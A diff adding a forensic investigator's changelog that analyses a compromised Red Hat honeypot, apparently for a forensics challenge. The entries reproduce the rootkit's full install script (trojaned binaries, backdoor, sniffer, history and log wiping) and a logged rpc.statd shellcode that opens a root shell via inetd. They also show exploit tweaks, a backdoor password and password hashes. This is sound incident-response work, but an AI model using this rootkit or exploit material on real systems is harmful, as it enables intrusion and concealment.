@@ -1,0 +1,733 @@
+2001-02-15 21:09:50+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* I'm looking a little bit at the recovered ssh tar file. The
+	first thing is configure understands a
+	--enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+	* The next thing
+	./config.h
+#define SSHD_LOGGER "/usr/tmp/nap"	
+	* Out of the configure script
+  --enable-global[=hash]
+                          Enable use of global password in sshd.
+                          Create hash by md5sum --string=password"
+	* Nice this sshd logs all the remote logins with the user/passwd
+	in clear in /usr/tmp/nap.
+	* md5sum --string=tw1Lightz0ne
+d33e8f1a6397c6d2efd9a2aae748eb02  "tw1Lightz0ne"
+	
+2001-02-14 23:55:04+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* I've looked a little bit closer at the tpack package and found
+	some interesting IP addresses in the egg.log file which is some
+	kind of Tcl startup script for this program:
+	...
+	set servers {
+	207.138.35.60
+	198.94.52.220
+	130.243.35.1
+	207.45.69.69
+	192.16.122.4
+	199.2.32.11
+	206.251.7.30
+	206.132.27.156
+	}
+	...
+	set sback "
+	207.138.35.60
+	209.81.232.66
+	205.153.208.10
+	198.94.52.220
+	216.32.132.250
+	130.243.35.1
+	63.211.17.182
+	192.160.127.97
+	141.211.26.105
+	207.45.69.69
+	199.2.32.11
+	206.251.7.30
+	206.132.27.156
+	"
+	* I created a standalone `tcl_'decrypt program log/blowfish.c
+	which can be used to decrypt the encrypted parts of egg.log
+	The following is a list of strings I found
+------------------------------------------------------------------------
+egg.log
+6692	set z [decrypt xx3fw3 bijph.s5f7N0]	--> TORO
+6694	set p "[decrypt f3qcadr3 DtVgR.E/mLu1]"	--> die0
+6769	set p "[decrypt aSp81yAFiA/oyjc iU3CW.7pnwu/]"	--> reset0
+7116	[decrypt clFua/ACQSB1aDZNz182aru0R0cJ1/8kzBZ/ 9xC15/VBEut1] \
+	[decrypt 6iI5s1U/0kj0ux9EJ.VDFeS0 EPffD1HbaPj.] \
+	[decrypt X7EnV1qJu9J/sUhVd0C5mZM. ftxIp0RBYWq.] \
+	[decrypt uutWQ0VGi8k0rF0xV1lTiK5. XLnzY..z0yt0] \
+	[decrypt iys4f1DqXWm0FdGom/KfLuC1 qRt8A.4SMM20] \
+						--> bind chon - * on_dcc
+7328	set wmail "[decrypt 65ty0hXeau/pk77x.dX 3AEfl/.23el/GowxN.aUrJT1]" \
+						--> toro00@yahoo.com
+------------------------------------------------------------------------
+						
+2001-01-30 01:33:57+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* I got the rpc.statd exploit working. Two minor things:
+	- Apparently my environment was a little bit different for the
+	rpc.statd. So I used the following command to start it:
+	RH6.2# env -i `cat /tmp/statd.env` /sbin/rpc.statd
+	where /tmp/statd.env contained:
+	RH6.2# cat /tmp/statd.env
+INIT_VERSION=sysvinit-2.78 mw=abcdef previous=S TERM=linux HOSTTYPE=i386
+	PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin
+	CONSOLE=/dev/console HOME=/ PREVLEVEL=S RUNLEVEL=3 SHELL=/bin/bash
+	runlevel=3 BOOT_IMAGE=linux-up OSTYPE=Linux SHLVL=2 _=/bin/nice
+	- The following minor changes were needed to the statd.c source
+	file mentioned below to make it work as it should.
+	$ diff -u statd.c.orig statd.c
+--- statd.c.orig        Thu Jan 25 23:37:30 2001
++++ statd.c     Mon Jan 29 17:42:11 2001
+@@ -59,7 +59,7 @@
+ {
+   unsigned long dir, ret;
+   int c, eat = 14;
+-  int first_n = 0xc9;
++  int first_n = 0xca;
+   char tmp[1024];
+   int i, i0, i1, i2;
+   char *ptr = shellcode;
+@@ -102,7 +102,7 @@
+   ptr = &shellcode[strlen(shellcode)];
+ 
+   for ( c = 0; c < eat; c++) {
+-    sprintf(ptr, "%%x ");
++    sprintf(ptr, "%%08x ");
+     ptr = &shellcode[strlen(shellcode)];
+   }
+	After that it worked with the same output as found in the
+	syslog buffer of the victim machine.
+	
+2001-01-27 01:35:06+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* I learned another thing: Even if inetd reports an exit 1 this
+	can still mean something bad happend to the process.  I've tried
+	that with the in.ftpd which caught the signal11 and exited with 1.
+	* I found a statd.c at
+	http://oliver.efri.hr/~crv/security/bugs/mUNIXes/statd3.html
+	which is similar to the one which was used for this rpc.statd
+	attack.  So far I was not able to break into my test system. The
+	stack appears to have a little bit different offset.
+	
+2001-01-26 22:24:58+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* start the grave-robber
+	orange-mw:/test/honeypot # ~marcow/tct/tct-1.05/bin/grave-robber -b /test/honeypot/grave/body.txt -c /test/honeypot/mount/ -d /test/honeypot/grave/ -e /test/honeypot/grave/error.txt -o LINUX2 -v -i -m -M -s -t -V 
+	orange-mw:/test/honeypot # ~marcow/tct/tct-1.05/bin/mactime -y -p /test/honeypot/mount/etc/passwd -g /test/honeypot/mount/etc/group -h -b grave/body.txt 11/06/2000 > grave/mactime.html
+	
+2001-01-25 17:12:10+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	*  198.94.52.220 Who own that address?? DNS lookup!
+
+2001-01-25 16:52:52+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* I did the same '.Ci/' lookup on the image which contained /tmp
+	and found another piece of the tar file.
+	log/Ci_hda7.tar
+	* I realized that lazarus has a bug in not finding (at least)
+	gzip'ed files.
+	Modified my sources and sent a email to Wietse(?) BUT did not yet
+	redo all the lazarus runs.
+
+2001-01-25 03:58:29+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* Some interesting bits out of former log files:
+	* these are GMT-0600 times!!	
+	hda7/blocks # less 42105.t.txt 42111.l.txt 42122.t.txt 42127.l.txt
+Nov  5 09:37:31 apollo PAM_pwdb[575]: (login) session opened for user root by LOGIN(uid=0)
+Nov  5 09:37:40 apollo kernel: EXT2-fs warning: mounting unchecked fs, running e2fsck is recommended
+Nov  5 09:41:59 apollo PAM_pwdb[575]: (login) session closed for user root
+Nov  5 10:50:26 apollo login: FAILED LOGIN 1 FROM (null) FOR  root, User not known to the underlying authentication module
+Nov  5 10:50:30 apollo PAM_pwdb[621]: (login) session opened for user root by LOGIN(uid=0)
+Nov  5 10:54:05 apollo modprobe: modprobe: Can't locate module eht0
+Nov  5 10:54:52 apollo inetd[408]: pid 680: exit status 1
+Nov  5 10:55:11 apollo PAM_pwdb[621]: (login) session closed for user root
+Nov  6 03:00:41 apollo ftpd[973]: FTP session closed
+Nov  8 00:08:41 apollo inetd[408]: pid 2077: exit status 1
+Nov  8 00:08:41 apollo inetd[408]: pid 2078: exit status 1
+Nov  8 00:09:00 apollo rpc.statd[270]: SM_MON request for hostname containing '/': ^D÷ÿ¿^D÷ÿ¿^E÷ÿ¿^E÷ÿ¿^F÷ÿ¿^F÷ÿ¿^G÷ÿ¿^G÷ÿ¿08049f10 bffff754 000028f8 4d5f4d53 72204e4f 65757165 66207473 6820726f 6e74736f 20656d61 746e6f63 696e6961 2720676e 203a272f 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff70400000000000000000000000000000000000000000000000bffff7050000bffff7060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff707ëK^‰v¬ƒî ^(ƒÆ ‰^°ƒî ^.ƒÆ ƒÃ ƒë#‰^´1Àƒî ˆF'ˆF*ƒÆ ˆF«‰F¸°+, ‰óN¬V¸Í€1Û‰Ø@Í€è°ÿÿÿ/bin/sh -c echo 4545 stream tcp nowait root /bin/sh sh -i >> /etc/inetd.conf;killall -HUP inetd
+
+	
+2001-01-25 02:24:40+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* Ok, I think I found a mostly intact tar file of the rootkit in
+	the deleted blocks of the usr image. Since I knew the install
+	script depends on the `.Ci/' name I tried to fgrep for this
+	string and found it in some packages which (with the packages in
+	between) were the tar file.
+	Look for log/Ci.tar;-)
+	* The nfs-utils & wu-ftpd RPM's came with that tar file!!
+	
+
+2001-01-23 06:51:38+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* Some interesting strings out of the swap space:
+@(#)named 8.2.2-P5 Thu Nov 25 16:18:38 CST 1999 root@zagnut.goobe.net:/dev/.oz/src/bin/named
+$Id: version.c,v 8.3 1999/01/02 06:05:14 vixie Exp $
+named 8.2.2-P5 Thu Nov 25 16:18:38 CST 1999
+root@zagnut.goobe.net:/dev/.oz/src/bin/named
+...
+bnlib 1.0.1 Copyright (c) 1995,1996 Colin Plumb.
+[128.95.120.2].1034
+...
+ZEUS.honeyp.edu
+localhos
+202.12.27.33
+...
+/usr/sbin/named
+LESSOPEN=|/usr/bin/lesspipe.sh %s
+HISTSIZE=1000
+HOSTNAME=apollo.honeyp.edu
+LOGNAME=adm1
+REMOTEHOST=c871553-b.jffsn1.mo.home.com
+MAIL=/var/spool/mail/adm1
+TERM=vt100
+HOSTTYPE=i386
+PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin
+HOME=/root
+INPUTRC=/etc/inputrc
+SHELL=/bin/bash
+USER=adm1
+LANG=en_US
+OSTYPE=Linux
+_=/usr/sbin/named
+SHLVL=5
+LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;
+/usr/sbin/named
+/proc/net/tcp
+...
+  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
+   0: 6B0110AC:0071 DC345EC6:045C 01 00000000:00000000 00:00000000 00000000    99        0 334
+   1: 6B0110AC:0404 DC345EC6:1A0B 01 00000000:00000000 00:00000000 00000000    99        0 5341
+   2: 6B0110AC:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 5302
+   3: 0100007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 5299
+   4: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 5068
+   5: 6B0110AC:0017 BAC80C18:1244 01 00000183:00000000 01:00000023 00000000     0        0 2739
+   6: 00000000:11C1 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 2431
+PRVW
+	* This looks like a /proc/net/tcp listing;-)
+	6b0110ac -> 172.16.1.107  -> our address
+	DC345EC6 -> 198.94.52.220
+	BAC80C18 -> 24.12.200.186 -> c871553-b.jffsn1.mo.home.com
+	* So at that time the `intruder' is still on this box!
+...
+<85>Nov  8 20:37:37 login: ROOT LOGIN ON tty1
+...
+<30>Nov  8 08:54:25 named[2964]: Forwarding source address is [0.0.0.0].1037
+<30>Nov  8 08:54:25 named[2964]: listening on [172.16.1.107].53 (eth0)
+<30>Nov  8 08:54:25 named[2964]: master zone "0.0.127.in-addr.arpa" (IN) loaded (serial 1997022700)
+<28>Nov  8 08:54:25 named[2964]: Zone "0.0.127.in-addr.arpa" (file named.local): No default TTL set using SOA minimum instead
+...
+<30>Nov  8 20:54:25 named[2965]: XSTATS 973738465 973695265 RR=3 RNXD=0 RFwdR=1 RDupR=0 RFail=0 RFErr=0 RErr=0 RAXFR=0 RLame=1 ROpts=0 SSysQ=1 SAns=37 SFwdQ=2 SDupQ=8 SErr=0 RQ=39 RIQ=0 RFwdQ=0 RDupQ=0 RTCP=0 SFwdR=1 SFail=0 SFErr=0 SNaAns=36 SNXD=0
+...
+Username:
+password - could not identify user
+password - out of memory
+Changing password for
+-UN*X-OLD-PASS
+(current) UNIX password:
+password - (old) token not obtained
+failed to set PAM_OLDAUTHTOK
+user not authenticated
+-UN*X-NEW-PASS
+Retype new UNIX password:
+Enter new UNIX password:
+...
+/root
+/bin/bash
+root
+$1$eJ2yI2DF$0cXQKjrEYcYHM/qJu2X6Z/
+11266
+...
+./dd bs=1024 < /dev/hda8 | ./nc 192.168.1.10 10000 -w 3
+...
+<28>Nov  8 08:59:52 inetd[408]: pid 2387: exit status 1
+<54>Nov  5 09:33:43 lpd[422]: restarted
+...
+./tripwire: /var/tmp/.lock
+0 2XDiaEO9hfAm46qwdmvciS 0 0 0 0 0 0 0 0
+0ucuFB
+0w1B47
+0ucuFB
+XDiaEO9hfAm46qwdmvciS
+001.X0
+26 001.X0
+/floppy/tw.config
+/usr/lib/ispell/americanxlg.hash
+	* So somebody made a tripwire database on this box!
+...
+passwd
+-UN*X-FAIL-adm1
+...
+<86>Nov  8 08:28:41 login: LOGIN ON 0 BY adm1 FROM c871553-b.jffsn1.mo.home.com
+<38>Nov  8 0       @pwdb[2404]: (su) session opened for user own by adm1(uid=5000)
+...
+@=apollo.honeyp.e
+LOGNAME=adm1
+REMOTEHOST=c871553-b.jffsn1.mo.home.com
+HOME=/tm
+which
+alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde
+which
+file
+/etc/inputrc
+su own
+file
+bash$
+...
+in.telnetd: c871553-b.jffsn1.mo.home.com
+	
+2001-01-23 06:01:35+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* I decided to install the two updated rpm's into my newroot. To
+	check the list again
+
+2001-01-23 05:06:07+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* I found the .Ci/install script as a partial tar file which was
+	probably in /tmp at the time 
+	hda8/blocks # strings 90158.t.txt | more
+.Ci/install
+0100755
+0001762
+0000144
+00000002730
+07144535562
+011640
+ustar
+users
+#!/bin/sh
+rm -rf /root/.bash_history
+ln -s /dev/null /root/.bash_history
+rm -rf /.bash_history
+ln -s /dev/null /.bash_history
+rm -rf ~games/.bash_history
+ln -s /dev/null ~games/.bash_history
+rm -rf /tmp/.bash_history
+ln -s /dev/null /tmp/.bash_history
+rm -rf /usr/games/.bash_history
+ln -s /dev/null /usr/games/.bash_history
+mkdir backup
+cp /bin/ps backup
+cp /usr/bin/top backup
+cp /usr/sbin/syslogd backup
+cp /bin/ls backup
+cp /bin/netstat backup
+cp /sbin/ifconfig backup
+cp /usr/sbin/tcpd backup
+echo "Trojaning in progress"
+./fix /bin/ps ps
+./fix /usr/bin/top top
+./fix /usr/sbin/syslogd syslogd
+./fix /bin/ls ls
+./fix /sbin/ifconfig ifconfig
+./fix /bin/netstat netstat
+./fix /usr/sbin/tcpd tcpd
+./fix /usr/sbin/in.identd in.identd
+killall -HUP syslogd
+./addbd
+./snif &
+echo "Sniffer ENABLED"
+echo "running clean and a.sh"
+./clean
+./a.sh
+mv ptyp /dev
+gunzip rpms.tgz;tar -xvf rpms.tar;cd rpms;rpm -Uvh --force *.rpm;cd ..;rm -rf rpms*
+killall -1 lpd
+rm -rf /var/log/wtmp
+cd /var/log
+touch wtmp
+cd /usr/man/.Ci     
+rm -rf install addbd
+killall -HUP inetd
+cp bx /bin/
+chmod 755 /bin/bx
+rm /usr/sbin/in.ftpd
+mv in.ftpd /usr/sbin/
+chmod +x /usr/sbin/in.ftpd
+echo "done with installing shit"
+echo "i'll now run whereis sshd"
+echo "if nothing shows up then run ./install-sshd"
+echo "if it's in /usr/local/sbin/sshd then run ./install-sshd"
+echo "if it's in /usr/sbin/sshd then run ./install-sshd1"
+whereis sshd
+echo "after successfully installing sshd, run ./do"
+echo "rootkit installation complete."
+
+	* I found the tar file for the ssh which was installed in
+	/usr/local
+	hda5/e2recover # tar tvf e2rec.30034.honeypot.hda5.dd.109791
+	(log/ssh.tar)
+	
+	* A new named package? It installs in /usr/local ??
+	hda5/e2recover # tar tvf e2rec.30034.honeypot.hda5.dd.109861
+	(log/named.tar)
+	
+	hda5/e2recover # file * | fgrep -i rpm
+e2rec.30034.honeypot.hda5.dd.109865: RPM v3 bin i386 nfs-utils-0.1.9.1-1
+e2rec.30034.honeypot.hda5.dd.109866: RPM v3 bin i386 wu-ftpd-2.6.0-14.6x
+	hda5/e2recover # ls -ln e2rec.30034.honeypot.hda5.dd.109865 e2rec.30034.honeypot.hda5.dd.109866
+-rw-r--r--   1 1010     100        180703 Aug 22 02:47 e2rec.30034.honeypot.hda5.dd.109865
+-rw-r--r--   1 1010     100        195637 Oct 11 22:37 e2rec.30034.honeypot.hda5.dd.109866
+	These two look like the official RedHat rpm's. Did somebody try to
+	fix something here?
+	
+2001-01-23 02:32:31+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	# for i in `find . -type f `
+	do
+	test -f ../newroot/$i || echo $i;
+	done > ../log/newfiles.log
+	gives a nice list of added files(Of course it also shows all the
+	files for which I could not find the right RPM to install):
+	* There are some interesting files/directories under /usr/man
+	like .Ci/, p, .p, r, .a which look like a rootkit of some kind.
+	* We also got this nice little /dev/ptyp file which looks like
+	another part of a rootkit.
+	
+2001-01-22 23:24:04+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* e2recover on the / image produced the following files which were
+	created & deleted around the incitent:
+-rw-r--r--   1 500      500       2129920 Nov  8 14:51 e2rec.21026.honeypot.hda8.dd.8133
+-rw-r--r--   1 500      500           119 Nov  8 14:58 e2rec.21026.honeypot.hda8.dd.60534
+-rw-r--r--   1 500      500           484 Nov  8 14:58 e2rec.21026.honeypot.hda8.dd.60533
+-rwxr-xr-x   1 500      500         11724 Nov  8 14:58 e2rec.21026.honeypot.hda8.dd.60535
+-rw-r--r--   1 500      500            29 Nov  8 14:58 e2rec.21026.honeypot.hda8.dd.60531
+-rw-r--r--   1 500      500          2164 Nov  8 14:58 e2rec.21026.honeypot.hda8.dd.60520
+-rw-r--r--   1 500      500           908 Nov  8 14:58 e2rec.21026.honeypot.hda8.dd.22200
+-rwxr-xr-x   1 500      500         14749 Nov  8 14:58 e2rec.21026.honeypot.hda8.dd.60502
+-rw-r--r--   1 500      500          3940 Nov  8 14:58 e2rec.21026.honeypot.hda8.dd.22194
+-rw-------   1 500      500         10723 Nov  8 14:58 e2rec.21026.honeypot.hda8.dd.22193
+
+	* There were a lot of files deleted at the time but I believe they
+	were part of a tar file or something similar.
+	* All the restored files are in tmp/hda8/e2recover
+	# file e2rec.21026.honeypot.hda8.dd.8133 e2rec.21026.honeypot.hda8.dd.60534 e2rec.21026.honeypot.hda8.dd.60533 e2rec.21026.honeypot.hda8.dd.60535 e2rec.21026.honeypot.hda8.dd.60531 e2rec.21026.honeypot.hda8.dd.60520 e2rec.21026.honeypot.hda8.dd.22200 e2rec.21026.honeypot.hda8.dd.60502 e2rec.21026.honeypot.hda8.dd.22194 e2rec.21026.honeypot.hda8.dd.22193
+e2rec.21026.honeypot.hda8.dd.8133:  GNU tar archive
+e2rec.21026.honeypot.hda8.dd.60534: ASCII text
+e2rec.21026.honeypot.hda8.dd.60533: ASCII text
+e2rec.21026.honeypot.hda8.dd.60535: data
+e2rec.21026.honeypot.hda8.dd.60531: ASCII text
+e2rec.21026.honeypot.hda8.dd.60520: ASCII text
+e2rec.21026.honeypot.hda8.dd.22200: data
+e2rec.21026.honeypot.hda8.dd.60502: ELF 32-bit LSB executable, Intel 80386, version 1, dynamically linked (uses shared libs), not stripped
+e2rec.21026.honeypot.hda8.dd.22194: data
+e2rec.21026.honeypot.hda8.dd.22193: data
+	* e2rec.21026.honeypot.hda8.dd.8133 contains a package named
+	`tpack version 2.3' From the drosen .bash_history it looks like
+	its official file name should be something like tpack*.tar. This
+	looks a lot like a modified/backdoored eggdrop source.
+	(log/tpack.tar)
+	
+	* e2rec.21026.honeypot.hda8.dd.60502 looks like the encrypt
+	program out of the `eggdrop' package.
+
+2001-01-22 22:53:14+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* A unrm & lazarus run on the / image found a lot of interesting
+	stuff.
+	* A old shadow file has some entries which are not longer present
+	# less 100332.t.txt
+drosen:$1$X2MTV07B$jKfJisg1QOjpfXouUcg0i0:11266:0:99999:7:-1:-1:134540380
+own::10865:0:99999:7:-1:-1:134538460
+adm1:Yi2yCGHo0wOwg:10884:0:99999:7:-1:-1:134538412
+	* A old passwd file is even more interesting because it shows that
+	own `owns' root privileges!!
+	# less 100343.w.txt
+drosen:x:500:500::/home/drosen:/bin/bash
+own:x:0:0::/root:/bin/bash
+adm1:x:5000:5000:Tech Admin:/tmp:/bin/bash
+	* This also shows that the UID 5000 which I've seen earlier
+	belongs to adm1 !
+	* There are a lot of other files but one more thing to note is
+	that somebody has built eggdrop on this box.
+	* I found the e2recover tool also very helpful. It knows more
+	about the FS than lazarus and can therefor work better as long as
+	the inodes are still present.
+	
+2001-01-22 18:53:44+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* A unrm & lazarus run on the home image did not find much
+	of interest.
+	* The srings output below was all the information I could find.
+	There were no bid binaries or anything.
+	# strings 1...txt
+gzip
+ld-2.1.3.so
+libc-2.1.3.so
+libnsl-2.1.3.so
+libnss_files-2.1.3.so
+
+2001-01-22 06:48:06+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* A nslookup for the one address I found:
+	marcow@feather:~ > nslookup
+Default Server:  dns1.dsldesigns.com
+Address:  192.216.138.10
+ 
+> c871553-b.jffsn1.mo.home.com
+Server:  dns1.dsldesigns.com
+Address:  192.216.138.10
+ 
+Name:    c871553-b.jffsn1.mo.home.com
+Address:  24.12.200.186
+
+> 207.239.115.11
+Server:  dns1.dsldesigns.com
+Address:  192.216.138.10
+ 
+Name:    stan.ksni.net
+Address:  207.239.115.11
+ 
+> 128.121.247.126
+Server:  dns1.dsldesigns.com
+Address:  192.216.138.10
+ 
+*** dns1.dsldesigns.com can't find 128.121.247.126: Non-existent host/domain
+> 216.216.74.2
+Server:  dns1.dsldesigns.com
+Address:  192.216.138.10
+ 
+Name:    ATHM-216-216-xxx-2.home.net
+Address:  216.216.74.2
+ 
+> 216.216.75.2
+Server:  dns1.dsldesigns.com
+Address:  192.216.138.10
+ 
+Name:    ATHM-216-216-xxx-2.home.net
+Address:  216.216.75.2
+
+	* http://www.redhat.com/support/errata/rh62-errata-security.html
+
+2001-01-20 04:04:24+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* My modified rpm
+	# /usr/local/bin/rpm --verify --root /test/honeypot/mount --dbpathx=/test/honeypot/newroot/var/lib/rpm `cat /tmp/rpm.name` > ../log/rpm-verify1.log
+package MAKEDEV-2.5.2-1 is not installed
+package screen-3.9.4-3 is not installed
+package telnet-0.10-29 is not installed
+package wu-ftpd-2.6.0-14.6x is not installed
+package am-utils-6.0.1s11-1.6.0 is not installed
+package lpr-0.48-1 is not installed
+package make-3.77-6 is not installed
+package ypserv-1.3.9-1 is not installed
+package nfs-utils-0.1.9.1-1 is not installed
+	* And the original
+	# rpm --verify --root /test/honeypot/mount `cat /tmp/rpm.name` > ../log/rpm-verify-orig.log
+	* It looks like this script did not mess with the rpm database.
+	* I could imagine somehow to put the `newly corrected' check
+	sums etc into the database. But apparently this script was
+	not smart enough.
+	* The filtered list is in log/rpm-verify-orig.log.interest
+	
+2001-01-20 01:36:06+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* Built a newroot system with the RPM's of the original image
+	* The following packages are different on the ISO image and
+	the once installed on the system
+RedHat 6.2 ISO			installed
+am-utils-6.0.3-1.i386.rpm	am-utils-6.0.1s11-1.6.0.*.rpm
+lpr-0.50-4.i386.rpm		lpr-0.48-1.*.rpm
+make-3.78.1-4.i386.rpm		make-3.77-6.*.rpm
+nfs-utils-0.1.6-2.i386.rpm	nfs-utils-0.1.9.1-1.*.rpm
+screen-3.9.5-4.i386.rpm		screen-3.9.4-3.*.rpm
+telnet-0.16-6.i386.rpm		telnet-0.10-29.*.rpm
+wu-ftpd-2.6.0-3.i386.rpm	wu-ftpd-2.6.0-14.6x.*.rpm
+ypserv-1.3.9-3.i386.rpm		ypserv-1.3.9-1.*.rpm
+	* I don't know iff they where installed in the first place but
+	only nfs-utils appears to have a newer version.
+	* They where installed at the time in question!
+	# rpm -q --dbpath /test/honeynet/mount/var/lib/rpm --all -last
+nfs-utils-0.1.9.1-1                 Wed Nov  8 14:53:49 2000
+wu-ftpd-2.6.0-14.6x                 Wed Nov  8 14:53:41 2000
+ypserv-1.3.9-1                      Wed Nov  8 14:52:33 2000
+telnet-0.10-29                      Wed Nov  8 14:52:33 2000
+screen-3.9.4-3                      Wed Nov  8 14:52:33 2000
+make-3.77-6                         Wed Nov  8 14:52:32 2000
+lpr-0.48-1                          Wed Nov  8 14:52:32 2000
+am-utils-6.0.1s11-1.6.0             Wed Nov  8 14:52:26 2000
+zlib-devel-1.1.3-6                  Sun Nov  5 01:04:48 2000
+[...]
+	
+2001-01-19 23:28:00+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* Now a global find over /var
+	# find . -newer /tmp/t1
+./lib/rpm/packages.rpm
+./lib/rpm/nameindex.rpm
+./lib/rpm/fileindex.rpm
+./lib/rpm/providesindex.rpm
+./lib/rpm/requiredby.rpm
+./lib/rpm/conflictsindex.rpm
+./lib/rpm/groupindex.rpm
+./lib/rpm/triggerindex.rpm
+./lib/nfs
+./lib/nfs/state
+./lib/slocate
+./lib/slocate/slocate.db
+./lib/logrotate.status
+./log
+./log/lastlog
+./log/wtmp
+./log/messages
+./log/secure
+./log/xferlog
+./log/cron
+./lock
+./lock/subsys/nfslock
+./run
+./run/utmp
+./run/sshd.pid
+./run/ndc
+./run/named.pid
+./spool/anacron/cron.daily
+./tmp
+./tmp/nap
+./yp
+	* Ok, the rpm database was modified. Have to rebuild one from the
+	original ISO image.
+	* /var/lib/nfs and the state file are changed around the interesting
+	time.
+	# ls -altrn lib/nfs
+total 5
+-rw-r--r--   1 0        0               0 Jul 17  2000 xtab
+-rw-r--r--   1 0        0               0 Jul 17  2000 rmtab
+-rw-r--r--   1 0        0               0 Jul 17  2000 etab
+drwx------   2 0        0            1024 Nov  5 15:33 sm.bak
+drwx------   2 0        0            1024 Nov  5 15:33 sm
+drwxr-xr-x   9 0        0            1024 Nov  6 10:02 ..
+drwxr-xr-x   4 0        0            1024 Nov  8 14:53 .
+-rw-------   1 0        0               4 Nov  8 14:54 state
+	* What is slocate? It looks like a tool to find all the
+	programs with s-bit set?
+	# ls -altrn lib/slocate/
+total 237
+drwxr-xr-x   9 0        0            1024 Nov  6 10:02 ..
+-rw-r-----   1 0        21         238767 Nov  8 10:02 slocate.db
+drwxr-x---   2 0        21           1024 Nov  8 10:02 .
+	* log/wtmp was cleared
+	# last -f log/wtmp
+root     tty1                          Thu Nov  9 02:37   still logged in
+ 
+wtmp begins Wed Nov  8 14:59:52 2000
+	* log/xferlog was cleared
+	# ls -ln log/xferlog
+-rw-r--r--   1 0        0               0 Nov  8 14:56 log/xferlog
+	* log/secure looks interesting
+	# ls -ln log/secure
+-rw-r--r--   1 0        0             268 Nov  8 14:56 log/secure
+	* !!!! These are GMT-0600 times!
+	# more log/secure
+Nov  5 10:54:49 apollo in.telnetd[680]: connect from 207.239.115.11
+Nov  6 02:59:23 apollo in.ftpd[973]: connect from 128.121.247.126
+Nov  8 00:08:40 apollo in.telnetd[2077]: connect from 216.216.74.2
+Nov  8 00:08:40 apollo in.telnetd[2078]: connect from 216.216.74.2
+	* log/messages has some interesting pieces
+	# ls -ln log/messages
+-rw-r--r--   1 0        0            7974 Nov  8 14:56 log/messages
+	* excerpts from log/messages
+	* these are GMT-0600 times!!
+	# more log/messages
+Nov  5 10:54:05 apollo modprobe: modprobe: Can't locate module eht0
+Nov  5 10:54:52 apollo inetd[408]: pid 680: exit status 1
+Nov  6 03:00:41 apollo ftpd[973]: FTP session closed
+...
+Nov  8 00:08:41 apollo inetd[408]: pid 2077: exit status 1
+Nov  8 00:08:41 apollo inetd[408]: pid 2078: exit status 1                      
+	* Why did the /var/yp directory change?
+	# ls -ldn yp
+drwxr-xr-x   3 0        0            1024 Nov  8 14:52 yp
+	
+
+2001-01-19 23:20:50+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* Looked at /var/tmp and found a file nap with the interesting
+	contents
+	# ls -aln
+total 3
+drwxrwxrwt   2 0        0            1024 Nov  8 15:02 .
+drwxr-xr-x  20 0        0            1024 Nov  5 01:04 ..
+-rw-r--r--   1 0        0             184 Nov  8 15:02 nap
+	# more nap
++-[ User Login ]-------------------- --- --- - -
+| username: root password: tw1Lightz0ne hostname: c871553-b.jffsn1.mo.home.com
++----------------------------------- ----- --- -- -- -
+	* It looks like this host plays a bigger role.
+
+2001-01-19 23:13:19+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* Looked a little bit at the /var partition
+	* rpm data was modified
+	* Most of the /var/log/* files were cleared or altered
+	* Modified lastlog a little bit and found
+	# /tmp/lastlog -ar/test/honeynet/mount
+Username         Port     From             Latest
+root             tty1                      Thu Nov  9 02:37:37 +0000 2000
+bin                                        **Never logged in**
+daemon                                     **Never logged in**
+adm                                        **Never logged in**
+lp                                         **Never logged in**
+sync                                       **Never logged in**
+halt                                       **Never logged in**
+mail                                       **Never logged in**
+news                                       **Never logged in**
+uucp                                       **Never logged in**
+operator                                   **Never logged in**
+games                                      **Never logged in**
+gopher                                     **Never logged in**
+ftp                                        **Never logged in**
+named                                      **Never logged in**
+postgres                                   **Never logged in**
+xfs                                        **Never logged in**
+nobody                                     **Never logged in**
+drosen                                     **Never logged in**
+uid5000          1        c871553-b.jffsn1 Wed Nov  8 14:45:24 +0000 2000
+	* What was the uid 5000 for??
+	
+2001-01-19 18:49:18+00  Marco Walther  <marcow@jena.eng.sun.com>
+
+	* First look at .../mount/home
+	# TZ=GMT-06 touch 1107230000 /tmp/t1
+	ls -l /tmp/t1
+-rw-r--r--   1 root     root            0 Nov  7 17:00 /tmp/t1
+	# find . -newer /tmp/t1
+./drosen
+./drosen/.bash_history
+	# ls -altnr ./drosen/
+total 32
+-rw-r--r--   1 500      500          3394 Nov  5 01:05 .screenrc
+-rwxr-xr-x   1 500      500           333 Nov  5 01:05 .emacs
